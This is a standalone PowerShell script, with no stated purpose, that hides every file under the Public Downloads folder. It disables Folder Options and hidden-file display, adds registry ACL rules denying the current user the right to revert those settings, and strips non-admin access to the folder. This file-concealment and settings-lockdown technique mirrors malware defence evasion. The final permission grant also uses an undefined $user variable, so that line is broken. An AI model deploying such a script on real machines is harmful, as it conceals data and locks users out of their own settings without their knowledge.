$targetPath = "C:\Users\Public\Downloads"
Get-ChildItem -Path $targetPath -Recurse -Force | ForEach-Object {
    try {
        attrib +h +s $_.FullName
    } catch {
        Write-Host "Failed to hide: $($_.FullName)"
    }
}

New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoFolderOptions" -PropertyType DWORD -Value 1 -Force
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "Hidden" -PropertyType DWORD -Value 2 -Force
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "ShowSuperHidden" -Value 0

$regPath1 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
$acl1 = Get-Acl $regPath1
$rule1 = New-Object System.Security.AccessControl.RegistryAccessRule("$(whoami)", "SetValue", "Deny")
$acl1.AddAccessRule($rule1)
Set-Acl $regPath1 $acl1

$regPath2 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
$acl2 = Get-Acl $regPath2
$rule2 = New-Object System.Security.AccessControl.RegistryAccessRule("$(whoami)", "SetValue", "Deny")
$acl2.AddAccessRule($rule2)
Set-Acl $regPath2 $acl2

icacls $targetPath /inheritance:r > $null
icacls $targetPath /grant:r SYSTEM:F > $null
icacls $targetPath /grant:r "Administrators":F > $null
icacls $targetPath /grant:r "$user":RX > $null

Write-Host "Files and folders are hidden, Folder Options disabled, registry locked, and non-admin access blocked."
